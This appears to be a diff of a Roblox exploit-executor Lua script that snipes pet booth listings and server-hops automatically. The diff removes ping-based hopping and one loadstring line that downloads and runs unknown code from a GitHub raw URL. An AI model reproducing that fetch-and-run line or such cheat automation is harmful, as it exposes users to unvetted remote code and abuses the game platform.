@@ -1,27 +1,6 @@
 local osclock = os.clock()
 repeat task.wait() until game:IsLoaded()
 
-local function getAveragePing()
-    local totalPing = 0
-    local playerCount = 0
-
-    for _, player in pairs(game.Players:GetPlayers()) do
-        if player:IsA("Player") and player ~= game.Players.LocalPlayer then
-            local ping = player:FindFirstChild("Ping")
-            if ping then
-                totalPing = totalPing + ping.Value
-                playerCount = playerCount + 1
-            end
-        end
-    end
-
-    if playerCount > 0 then
-        return totalPing / playerCount
-    else
-        return 0
-    end
-end
-
 setfpscap(10)
 game:GetService("RunService"):Set3dRenderingEnabled(false)
 local Booths_Broadcast = game:GetService("ReplicatedStorage").Network:WaitForChild("Booths_Broadcast")
@@ -32,7 +11,6 @@ local http = game:GetService("HttpService")
 local ts = game:GetService("TeleportService")
 local rs = game:GetService("ReplicatedStorage")
 local playerID
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xccsdf/abc/main/test.lua"))()
 
 if not snipeNormalPets then
     snipeNormalPets = false
@@ -274,13 +252,6 @@ Players.PlayerAdded:Connect(function(player)
 end) 
 
 while task.wait(1) do
-    local averagePing = getAveragePing()
-    local pingThreshold = 300 -- Adjust this value based on your desired threshold
-
-    if averagePing > pingThreshold then
-        jumpToServer()
-    end
-
     if math.floor(os.clock() - osclock) >= math.random(900, 1200) then
         jumpToServer()
     end
